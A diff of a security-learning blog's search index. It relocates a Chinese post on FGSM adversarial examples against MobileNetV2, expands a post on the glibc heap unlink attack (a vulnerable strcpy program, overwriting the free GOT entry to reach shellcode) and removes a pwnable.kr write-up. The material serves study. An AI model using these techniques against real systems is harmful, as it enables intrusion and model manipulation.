@@ -1,68 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>阅读深度学习的对抗攻击方法综述及实例</title>
-    <url>/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/0.png" class></strong></p>
- <a id="more"></a>
-
-<div class="pdfobject-container" data-target="/PDF/深度学习的对抗攻击方法综述.pdf" data-height="500px"></div>
-
-<p>对抗样本攻击大体原理如下：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/3.png" class></strong></p>
-<h3 id="什么是对抗性例子？"><a href="#什么是对抗性例子？" class="headerlink" title="什么是对抗性例子？"></a>什么是对抗性例子？</h3><p>对抗性示例是专门创建的输入，其目的是混淆神经网络，从而导致给定输入的分类错误。这些臭名昭著的输入对于人眼是无法区分的，但是会导致网络无法识别图像的内容。这类攻击有几种类型，但是，这里的重点是快速梯度符号方法攻击，这是一种<em>白盒</em>攻击，其目的是确保错误分类。白盒攻击是攻击者可以完全访问被攻击模型的地方。举下面两个例子：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/2.png" class></strong></p>
-<p>原始图像（左图），对抗噪声（中图），扰动后的图片即对抗样本（右图）被错误地分类为数字 2。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/1.png" class></strong></p>
-<p>在这里，从熊猫的图像开始，攻击者向原始图像添加了较小的扰动（失真），这导致模型以较高的置信度将该图像标记为长臂猿。下面说明添加这些扰动的过程。</p>
-<h3 id="快速梯度符号法-FGSM"><a href="#快速梯度符号法-FGSM" class="headerlink" title="快速梯度符号法(FGSM)"></a>快速梯度符号法(FGSM)</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/11.png" class></strong></p>
-<p>下面展示简单的利用<a href="https://blog.csdn.net/crystal_sugar/article/details/106023055?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">FGSM原理</a>实现的示例。</p>
-<p><strong>FGSM</strong>的工作原理是利用神经网络的梯度来创建一个<strong>Adversarial example</strong>。对于输入图像，该方法使用相对于输入图像的损失的梯度来创建使损失函数最大化的新图像。这个新图像被称为对抗图像。</p>
-<p>在这里，梯度是相对于输入的图像的。这样做是因为其目标是创造一个最大化损失的图像。实现这一点的方法是找出图像中每个像素对损失值的贡献程度，并相应地添加一个扰动（使用链式规则去计算梯度可以很容易地找到每个输入像素的贡献程度）。此外，由于模型不再被训练（因此梯度不针对可训练变量，即模型参数），因此模型参数保持不变。唯一的目的就是使一个已经受过训练的模型发生错误的分类。<br>在这篇文章中，模型是<strong>MobileNetV2</strong>模型，在<strong>ImageNet</strong>上进行了预训练。</p>
-<h3 id="导入所需要的库"><a href="#导入所需要的库" class="headerlink" title="导入所需要的库"></a>导入所需要的库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>
-
-<h3 id="设置图片相关信息"><a href="#设置图片相关信息" class="headerlink" title="设置图片相关信息"></a>设置图片相关信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 图片像素</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;figure.figsize&#x27;</span>] = (<span class="number">8</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 图片网格</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.grid&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="载入MobileNetV2模型"><a href="#载入MobileNetV2模型" class="headerlink" title="载入MobileNetV2模型"></a>载入<a href="https://www.tensorflow.org/api_docs/python/tf/keras/applications/MobileNetV2">MobileNetV2</a>模型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pretrained_model = tf.keras.applications.MobileNetV2(include_top=<span class="literal">True</span>, weights=<span class="string">&#x27;imagenet&#x27;</span>)</span><br><span class="line">pretrained_model.trainable = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="图像预处理"><a href="#图像预处理" class="headerlink" title="图像预处理"></a>图像预处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess</span>(<span class="params">image</span>):</span></span><br><span class="line">    image = tf.cast(image, tf.float32)</span><br><span class="line">    image = image/<span class="number">255</span></span><br><span class="line">    image = tf.image.resize(image, (<span class="number">224</span>, <span class="number">224</span>))</span><br><span class="line">    image = image[<span class="literal">None</span>, ...]</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片信息</span></span><br><span class="line">image_path = tf.keras.utils.get_file(<span class="string">&#x27;YellowLabradorLooking_new.jpg&#x27;</span>,<span class="string">&#x27;https://storage.googleapis.com/download.tensorflow.org/example_images/YellowLabradorLooking_new.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">image_raw = tf.io.read_file(image_path)</span><br><span class="line">image = tf.image.decode_image(image_raw)</span><br><span class="line"></span><br><span class="line">image = preprocess(image)</span><br></pre></td></tr></table></figure>
-
-<h3 id="将图像输入模型并得到概率最高的分类结果"><a href="#将图像输入模型并得到概率最高的分类结果" class="headerlink" title="将图像输入模型并得到概率最高的分类结果"></a>将图像输入模型并得到概率最高的分类结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Helper function to extract labels from probability vector</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imagenet_label</span>(<span class="params">probs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> tf.keras.applications.mobilenet_v2.decode_predictions(probs, top=<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">image_probs = pretrained_model.predict(image)</span><br></pre></td></tr></table></figure>
-
-<h3 id="展示图像"><a href="#展示图像" class="headerlink" title="展示图像"></a>展示图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure()</span><br><span class="line">plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">_, image_class, class_confidence = get_imagenet_label(image_probs)</span><br><span class="line">plt.title(<span class="string">&#x27;&#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(image_class, class_confidence*<span class="number">100</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/4.png" class></strong></p>
-<p>可以准确地预测出图像为拉布拉多犬（可能性最高为37.16%）</p>
-<h3 id="计算梯度"><a href="#计算梯度" class="headerlink" title="计算梯度"></a>计算梯度</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_object = tf.keras.losses.CategoricalCrossentropy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_adversarial_pattern</span>(<span class="params">input_image, input_label</span>):</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(input_image)</span><br><span class="line">        prediction = pretrained_model(input_image)</span><br><span class="line">        loss = loss_object(input_label, prediction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the gradients of the loss w.r.t to the input image.</span></span><br><span class="line">    gradient = tape.gradient(loss, input_image)</span><br><span class="line">    <span class="comment"># Get the sign of the gradients to create the perturbation</span></span><br><span class="line">    signed_grad = tf.sign(gradient)</span><br><span class="line">    <span class="keyword">return</span> signed_grad</span><br></pre></td></tr></table></figure>
-
-<h3 id="打印添加的噪音图像"><a href="#打印添加的噪音图像" class="headerlink" title="打印添加的噪音图像"></a>打印添加的噪音图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the input label of the image.</span></span><br><span class="line">labrador_retriever_index = <span class="number">208</span></span><br><span class="line">label = tf.one_hot(labrador_retriever_index, image_probs.shape[<span class="number">-1</span>])</span><br><span class="line">label = tf.reshape(label, (<span class="number">1</span>, image_probs.shape[<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">perturbations = create_adversarial_pattern(image, label)</span><br><span class="line">plt.imshow(perturbations[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/5.png" class></strong></p>
-<h3 id="定义显示图像的函数"><a href="#定义显示图像的函数" class="headerlink" title="定义显示图像的函数"></a>定义显示图像的函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_images</span>(<span class="params">image, description</span>):</span></span><br><span class="line">    _, label, confidence = get_imagenet_label(pretrained_model.predict(image))</span><br><span class="line">    plt.figure()</span><br><span class="line">    plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">    plt.title(<span class="string">&#x27;&#123;&#125; \n &#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(description,</span><br><span class="line">                                                   label, confidence*<span class="number">100</span>))</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
-
-<h3 id="加入噪声后再将图像输入模型进行判断"><a href="#加入噪声后再将图像输入模型进行判断" class="headerlink" title="加入噪声后再将图像输入模型进行判断"></a>加入噪声后再将图像输入模型进行判断</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">epsilons = [<span class="number">0</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">0.15</span>]</span><br><span class="line">descriptions = [(<span class="string">&#x27;Epsilon = &#123;:0.3f&#125;&#x27;</span>.format(eps) <span class="keyword">if</span> eps <span class="keyword">else</span> <span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> eps <span class="keyword">in</span> epsilons]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, eps <span class="keyword">in</span> enumerate(epsilons):</span><br><span class="line">    adv_x = image + eps*perturbations</span><br><span class="line">    adv_x = tf.clip_by_value(adv_x, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    display_images(adv_x, descriptions[i])</span><br></pre></td></tr></table></figure>
-
-<p>其中<strong>epsilons</strong> 表示噪声的干扰程度。</p>
-<h4 id="输入图片"><a href="#输入图片" class="headerlink" title="输入图片"></a>输入图片</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/6.png" class></strong></p>
-<h4 id="噪声为0-01"><a href="#噪声为0-01" class="headerlink" title="噪声为0.01"></a>噪声为0.01</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/7.png" class></strong></p>
-<p>识别为Ibizan柴犬</p>
-<h4 id="噪声为0-1"><a href="#噪声为0-1" class="headerlink" title="噪声为0.1"></a>噪声为0.1</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/8.png" class></strong></p>
-<p>识别为浴巾</p>
-<h3 id="噪声为0-15"><a href="#噪声为0-15" class="headerlink" title="噪声为0.15"></a>噪声为0.15</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/9.png" class></strong></p>
-<p>识别为脑珊瑚</p>
-<h3 id="噪声为0-20"><a href="#噪声为0-20" class="headerlink" title="噪声为0.20"></a>噪声为0.20</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/10.png" class></strong></p>
-<p>识别为毛毯</p>
-<p>可见，输入图片添加噪声之后已经不能正确分类。</p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>Adversarial sample</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Heap I</title>
     <url>/xiaohong404.github.io/2020/10/16/Heap/Heap-I/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/0.png" class></strong></p>
@@ -152,59 +90,97 @@
       </tags>
   </entry>
   <entry>
-    <title>unlink</title>
+    <title>unlink漏洞攻击</title>
     <url>/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
  <a id="more"></a>
 
-<h3 id="从一段代码入手"><a href="#从一段代码入手" class="headerlink" title="从一段代码入手"></a>从一段代码入手</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="从一段代码开始"><a href="#从一段代码开始" class="headerlink" title="从一段代码开始"></a>从一段代码开始</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" alt="img"></p>
+<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
+<h2 id="什么是unlink"><a href="#什么是unlink" class="headerlink" title="什么是unlink"></a>什么是unlink</h2><p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
+<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
+<h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
+<p>malloc.c 中向后合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>
+
+<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
+<h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
+<p>malloc.c 中向前合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>PWN</category>
         <category>Heap</category>
-        <category>Heap_Basic</category>
+        <category>Heap_Attack</category>
       </categories>
       <tags>
         <tag>PWN</tag>
       </tags>
   </entry>
   <entry>
-    <title>Heap-III</title>
-    <url>/xiaohong404.github.io/2020/10/24/Heap/Heap-III/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Heap</category>
-        <category>Heap_Basic</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blukat</title>
-    <url>/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/0.png" class></strong></p>
+    <title>阅读深度学习的对抗攻击方法综述及实例</title>
+    <url>/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/0.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/1.png" class></strong></p>
-<h3 id="查看blukat-c源文件"><a href="#查看blukat-c源文件" class="headerlink" title="查看blukat.c源文件"></a>查看blukat.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">&quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">                flag[i] = s[i] ^ key[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FILE* fp = fopen(<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">        fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span class="line">                calc_flag(password);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<div class="pdfobject-container" data-target="/PDF/深度学习的对抗攻击方法综述.pdf" data-height="500px"></div>
 
-<p>程序先读取password文件中的内容到password数组中，之后使用buf缓冲区读取用户输入的字符，buf缓冲区的大小为100，而读取的字符为128，之后比较用户输入的字符和password数组中的内容，如果相等，则可以执行cacl_flag函数，经过和密钥的异或运算计算出flag。如果采用缓冲区溢出覆盖fgets的返回地址为函数calc_flag的地址，由于不知道password的内容，无法正确计算出flag，因此这里缓冲区溢出攻击行不通。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>想到本题题干中的描述，本题应该是具有一种巧妙的解法（<a href="https://blog.csdn.net/jackywgw/article/details/41545957">ls-la各项说明​</a>）。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/2.png" class></strong></p>
-<p>这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令：</p>
-<p>提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/3.png" class></strong></p>
+<p>对抗样本攻击大体原理如下：</p>
